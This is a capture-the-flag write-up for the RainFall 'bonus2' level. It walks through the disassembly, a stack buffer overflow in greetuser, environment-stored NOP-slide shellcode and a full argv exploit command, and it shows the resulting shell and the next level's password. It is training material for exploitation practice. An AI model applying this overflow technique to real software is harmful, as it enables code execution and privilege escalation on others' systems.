This program checks if 2 args are provided, else it returns
 8048538:	83 7d 08 03          	cmp    DWORD PTR [ebp+0x8],0x3
 804853c:	74 0a                	je     8048548 <main+0x1f>
 804853e:	b8 01 00 00 00       	mov    eax,0x1
 8048543:	e9 e8 00 00 00       	jmp    8048630 <main+0x107>
 8048548:	8d 5c 24 50          	lea    ebx,[esp+0x50]	; dest

It then bzero the dest buffer, strncpy the first 0x28 bytes of argv[1] on dest.
Then the first 0x20 bytes of argv[2] on dest + 0x28


With the value of getenv("LANG"), it loads the language global variable, checking the fist 2 bytes.
	>default = 0: "Hello "
	>1: "Hyv\u00e4\u00e4 p\u00e4iv\u00e4\u00e4 "
	>2: "Goedemiddag! "
This branching is important, as it determines how many bytes we'll be able to write on the stack, eventually overwrite the return eip of the greetuser function

Then it writes dest on the stack and calls greetuser.
...
 8048618:	89 e2                	mov    edx,esp
 804861a:	8d 5c 24 50          	lea    ebx,[esp+0x50]			; dest
 804861e:	b8 13 00 00 00       	mov    eax,0x13
 8048623:	89 d7                	mov    edi,edx
 8048625:	89 de                	mov    esi,ebx
 8048627:	89 c1                	mov    ecx,eax
 8048629:	f3 a5                	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
 804862b:	e8 54 fe ff ff       	call   8048484 <greetuser>
...
In greetuser, a buffer on the stack located at ebp-0x48 is filled with some greetings corresponding with the current LANG, out of the three possibilities, we pick the longest greating: the one with LANG=fi, as to reach the furthest on the stack and overwrite the return eip of greetuser, this is where we can redirect code execution. :
export LANG=fi

When greetuser is called the stack can be setup so its return will pop to our shellcode (placed either on env or argv or the stack), the main problem is to place a reference to our shellcode when leave is called, then ret jumps to it.
We start by storing the shellcode with a nop slide in the environnement :

nasm ./Resource/shellcode.asm
[Upload the resulting ./Resource/shellcode to the vm at /tmp] : cat ../bonus1/flag | clipboard ; scp -P 4242 ./Resource/shellcode bonus2@rainfall:/tmp
export SHELLCODE="`python -c 'import sys; sys.stdout.write("\x90" * 1000)'``cat /tmp/shellcode`"

We then figure out the address of the shellcode using gdb :
bonus2@RainFall:~$ gdb --args ./bonus2 "" ""
[Removed for readability]
(gdb) b main
Breakpoint 1 at 0x804852f
(gdb) run
Starting program: /home/user/bonus2/bonus2 '' ''

Breakpoint 1, 0x0804852f in main ()
(gdb) print ((char**)environ)[0]
$1 = 0xbffff
(gdb) 

Therefore the nop slide starts at 0xbffff507, any return to this address or the 1000 bytes after it will result in the execution of the shellcode. We'll call this address SHELLCODE_ADDR. We'll use SHELLCODE_ADDR + 256 to make sure we land in the nop slide, as the environ's addresses might move a bit. 0xbffff507 + 256 = 0xbffff607


We'll make it so dest contained first 40 bytes of non-zero padding from argv[1], then the address to the shellcode n times such that the address is overwritten on the return address of greetuser, therefore executing the shellcode.
In order to realigned the shellcode address to address boundary, the way we write the address in argv[2] is slighty shifted (by 2 bytes).

So now we design our shell command like this:
./bonus2 "[inject 0x28 = 40 bytes of non-zero padding]" "[inject SHELLCODE_ADDR n times using python][inject a zero byte so that the strcat finishes]"

bonus2@RainFall:~$ ./bonus2 "`python -c 'import sys; sys.stdout.write("A" * 40)'`" "`python -c 'import sys; sys.stdout.write("\xff\xbf\x06\xf6" * 9); sys.stdout.write("\x00" * 1)'`"
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA������������������������
$ whoami
bonus3
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
$ 



